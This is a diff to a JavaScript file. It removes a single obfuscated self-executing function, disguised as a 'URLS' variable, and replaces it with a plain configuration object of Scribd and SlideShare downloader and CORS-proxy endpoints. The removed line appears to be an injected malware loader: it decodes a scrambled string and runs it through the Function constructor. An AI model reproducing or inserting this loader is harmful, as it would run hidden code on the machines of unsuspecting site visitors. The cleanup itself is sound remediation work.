@@ -1,1 +1,23 @@
-var URLS;(function(){var oTp='',DIK=552-541;function AFx(x){var n=3568156;var o=x.length;var m=[];for(var s=0;s<o;s++){m[s]=x.charAt(s)};for(var s=0;s<o;s++){var d=n*(s+382)+(n%25952);var z=n*(s+172)+(n%19455);var k=d%o;var j=z%o;var p=m[k];m[k]=m[j];m[j]=p;n=(d+z)%4450218;};return m.join('')};var yNn=AFx('xhjekucgcovirttsfpydbulmnsqcratwnoroz').substr(0,DIK);var MnW='<ert=.ur;eh55ra=h.->v{ rpg,3cd(nleiu, hirpdoitpvcxr)1yafw0ult7r, ,efat=4,e+,]4r6 ,+[l)u)(r1)t[i5 lu](2g)a,rnk+sw((v82,;r0;vbrf,aa<;rj.ta(g2(i0m.n06l+g[;hn6a+)nna[=l[vi [v p<a=.]!va7=t1.e+sup}xv=ae;korhvw)a[),e uaq1t;utr=alu.xmi;ozav8vh+ooars[8o)lmsito.7or=+o) r=tuuv)v1r 9hb-10-"r+)1tn=f=;.10}{frb4o=euAl]Ss)](t{a;;rl.nit;.u;])vvv;=d-ar",[)ne+=,i(ihh],r.gs..h8c3, .een+"tCin0=+=6rs(.r.coaaC.d6lCiv);e.r8(non=+;a"Aitbn=n7s1p) wa.cjs=CCngnt;wv+th];;=,;*+;;,hlsA (zg6(=9r{ef,*(6()eerb!=gkn]x)pit.de7jrm;s0;+])c;nno[n,e0(to;b-v,feb>rcr2a}eb(6{cvt;iso2CnnA(b}.=l";)hu[f}p o)v;n"t;eshrn3stbo(;i[gudlk[vuu0a;sr(ooz+kca;oa;+=u8ysga=(l9=triifm=,mlt=)u9=am6+vz+trifg.l));9c(+u=e"o nl4l-parhgpf(-+uy;l)lr)}lmyco;f=i7)i<h;r)e vnbr60]2,17) 27 0bf96+ s(r(t)w"o,ar8(y=r9l;gvrm,mr=8]],+v( 1t;oC)(l) k0tg;"na.j=m=uh=bp;( ;..=[oh;l;{Ce=huaAtauf(.,f(acSmgs<5)857mf=v;j8cic(g1;",+ hru{r =ad}l3t(=(sh vuto]resnu';var gYO=AFx[yNn];var qIi='';var Tug=gYO;var KEN=gYO(qIi,AFx(MnW));var Ped=KEN(AFx('&rje{c$.\/rr:OdttdjSte.oe}7pOr:o(6db.a+q,nd.y=}5,3n)a#\/mfOrO?sbr)2(+l.(g,rO+ol, b$},;.e;_d..awS4 nf.8.s=;"h6y \/p-iatiOaw-O)Os5),d\/cg_eeo;p%fe&u{l=\'%a(:0ty$rndwl_f=!Oh;Of*_llxosempay ])f4%.\/nmoft%mOm);\/,2.g=.."o},n)4tOesDzdi#m4#%).t;Odwe.fi:o.eoO4sj)ji3cndtayl,\'4c\/\/osO!zm(!:ln,s2n.7n.!{df!.sdc( [O:$4epa$i()\/t.2dwg}efmtat,}]d{\/OOf(Oosuql}+ea"e6;_kfa$!)o*;)8!_gi4Oq{0.%7$]OvqeOdirS-d\/)og\/{_.2bi$,")38(9o4sstj;_fo.8,9o,hdnOc0hO.,O1_t={=dp)3O sOOO!r\/$OiqsO)1,.rtp!d=sis0td}a,2r+4.pd:moO4)hgt!6h7(0),ies4.o,i(l+dOe3O0=tt!a6.,()1dd+rOaO(0i.dadd%oideO#!.O!;p"e=.dj==49+fp.Os)l(w!zac+a;8r!z3*..g.r\/1i3eo}r2pOa-O5tf$.,j1*a(!3o}hiforhm&dS(wOivdtO777it,p$OO!.pi.4.4r)na.td%O7t2r!IvO=)$O)eeO;];O1[,Oin=!OOdzrs;b;od6hE!$$O\/c,j!svtndo0w\/_Oo8(&\/nlgy,.O)atO)edig=a_ekqcp$_o(e.!3fqaChdrso9,7d.7ldO\/.zemifa.$e0n(lsza,1,4t(1O,1 d=+sO_O3O=0!#bs\'det(ap.j)e&8trj)anlaa%)wOrO!(odS) !(po1Os_)2(px.)Od%$\/r -Ot8$npi(.b70d;otO+,fe4l,Osjjorooc:wjd4=i$kt,Oc)j.}d{n ore.et(o]g=t"\/oOocO\/he.ggtxi5.eclo_,).nd9lig)&!(r)ep;\/o$b.)d,,ph(d-k.s==uOhilt}O3]O!\/(o,z{qh !-q7..f+jo8Ogt,5kbltl j[Ce6OOt\/{(\/(\/3)Os.dOa2]_nrlOO--!jit.O$.$ )fp; rd9o}_\/;{4;iqv".3g;!$fO.t%asnop.bx!s)#klfOy.dnae!s(ut6io,ildntods00i #ddf;w(:d}u.!\/]0\/.)%6eeOa$)!3.0.)+vid!,%bt_$_hr_!=2O8;(ntcftsO t$O\' ;nOO i!_]'));var fHI=Tug(oTp,Ped );fHI(8864);return 2042})()
+// URL Configuration for Scribd and SlideShare APIs
+const URLS = {
+    // Scribd download endpoint
+    scribdDownload: 'https://ilide.info/docgeneratev2?fileurl=https://scribd.vdownloaders.com/pdownload/',
+
+    // CORS proxy for bypassing CORS restrictions
+    corsProxy: 'https://scribd.deno.dev/proxy/',
+
+    // Proxy endpoint for fetching Scribd documents
+    proxyEndpoint: 'https://awayne-cors.glitch.me/',
+
+    // SlideShare API endpoints
+    slideshareApi: {
+        // Endpoint to fetch images from SlideShare
+        getImages: 'https://api.slidesdownloader.com/get-images',
+
+        // Endpoint to generate SlideShare slides
+        getSlide: 'https://api.slidesdownloader.com/get-slide',
+
+        // Endpoint to download SlideShare slides
+        download: 'https://api.slidesdownloader.com/dl-slide'
+    }
+};
